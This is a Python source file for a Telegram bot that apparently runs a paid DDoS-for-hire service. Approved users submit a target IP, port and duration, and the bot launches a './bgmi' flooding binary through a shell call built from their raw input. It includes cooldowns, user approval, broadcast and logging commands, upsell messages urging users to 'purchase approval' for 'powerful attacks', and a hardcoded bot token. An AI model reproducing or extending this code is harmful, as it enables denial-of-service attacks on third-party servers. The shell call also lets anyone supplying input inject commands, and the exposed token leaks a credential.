import telebot
import subprocess
import datetime
import os
import logging
import time

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('6921680287:AAEL2ojcHgaUpOd5Gtq0R6XBtYEEiJW7pd0')
# Owner and admin user IDs
owner_id = "6281757332"
admin_ids = ["ADMIN_USER_ID1", "ADMIN_USER_ID2"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# Dictionary to store last attack time and credits
user_last_attack = {}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Read allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open("log.txt", "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = (
        f"🚀 **Attack Initiated!** 💥\n\n"
        f"🗺️ **Target IP:** {target}\n"
        f"🔌 **Target Port:** {port}\n"
        f"⏳ **Duration:** {time} seconds\n\n"
        f"✅ **Successfully Executed:** 3/3\n\n"
    )
    bot.reply_to(message, response)

# Handler for /attack command and direct attack input
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        # Check last attack time for cooldown
        current_time = time.time()
        last_attack_time = user_last_attack.get(user_id, 0)
        wait_time = 180.0 - (current_time - last_attack_time)
        
        if wait_time > 0:
            response = f"🚫 **You must wait {wait_time:.2f} seconds before initiating another attack.**"
        else:
            # Proceed with attack command
            command = message.text.split()
            if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
                if not message.text.startswith('/'):
                    command = ['/attack'] + command  # Prepend '/attack' to the command list
                target = command[1]
                port = int(command[2])
                time_duration = int(command[3])
                if time_duration > 181:
                    response = "❌ **Error:** Time interval must be less than 181 seconds."
                else:
                    user_last_attack[user_id] = current_time
                    log_command(user_id, target, port, time_duration)
                    start_attack_reply(message, target, port, time_duration)
                    full_command = f"./bgmi {target} {port} {duration}"
                    subprocess.run(full_command, shell=True)
            else:
                response = "Please provide the attack in the following format: <HOST> <PORT> <TIME>"
    else:
        # Unauthorized access message
        response = (
            "🚫 **Unauthorized Access!** 🚫\n\n"
            "Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n"
            "👉 **Contact an Admin or the Owner for approval.**\n"
            "🌟 **Become a proud supporter and purchase approval.**\n"
            "💬 **Chat with an admin now and level up your capabilities!**\n\n"
            "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"
        )
    bot.reply_to(message, response)

# Command to approve users
@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if user_to_approve not in allowed_user_ids:
                allowed_user_ids.append(user_to_approve)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_approve} {duration}\n")
                response = f"✅ **User {user_to_approve} has been approved for {duration}!**"
            else:
                response = f"❌ **User {user_to_approve} is already approved!**"
        else:
            response = "⚠️ **Usage:** /approveuser <user_id> <duration>"
    else:
        response = "❌ **Only Admins or the Owner can approve users!** 😡"
    bot.send_message(message.chat.id, response)

# Command to remove users
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"🗑️ **User {user_to_remove} has been removed successfully!**"
            else:
                response = f"❌ **User {user_to_remove} not found!**"
        else:
            response = "⚠️ **Usage:** /removeuser <user_id>"
    else:
        response = "❌ **Only Admins or the Owner can remove users!** 😡"
    bot.send_message(message.chat.id, response)

# Command to list all users
@bot.message_handler(commands=['allusers'])
def all_users(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        users_list = []
        for user in allowed_user_ids:
            try:
                user_info = bot.get_chat(user)
                username = user_info.username if user_info.username else "No Username"
                users_list.append(f"UserID: {user}, Username: @{username}")
            except Exception as e:
                users_list.append(f"UserID: {user} (Error fetching username)")
        
        response = "\n".join(users_list) if users_list else "No users found."
        bot.send_message(message.chat.id, response)
    else:
        bot.send_message(message.chat.id, "❌ **Only Admins or the Owner can view all users!** 😡")

# Command to broadcast message to all users
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split(maxsplit=1)
        if len(command) == 2:
            broadcast_message = command[1]
            for user in allowed_user_ids:
                try:
                    bot.send_message(user, broadcast_message)
                except Exception as e:
                    logging.error(f"Failed to send message to {user}: {e}")
            bot.send_message(message.chat.id, "✅ **Broadcast sent to all users!**")
        else:
            bot.send_message(message.chat.id, "⚠️ **Usage:** /broadcast <message>")
    else:
        bot.send_message(message.chat.id, "❌ **Only Admins or the Owner can send broadcasts!** 😡")

# Command to view logs
@bot.message_handler(commands=['logs'])
def view_logs(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        try:
            with open("log.txt", "r") as log_file:
                logs = log_file.read()
                if logs:
                    bot.send_message(message.chat.id, f"```\n{logs}\n```", parse_mode="MarkdownV2")
                else:
                    bot.send_message(message.chat.id, "No logs available.")
        except Exception as e:
            bot.send_message(message.chat.id, "❌ **Failed to read logs.**")
            logging.error(f"Error reading logs: {e}")
    else:
        bot.send_message(message.chat.id, "❌ **Only Admins or the Owner can view logs!** 😡")

# Start the bot
bot.polling()
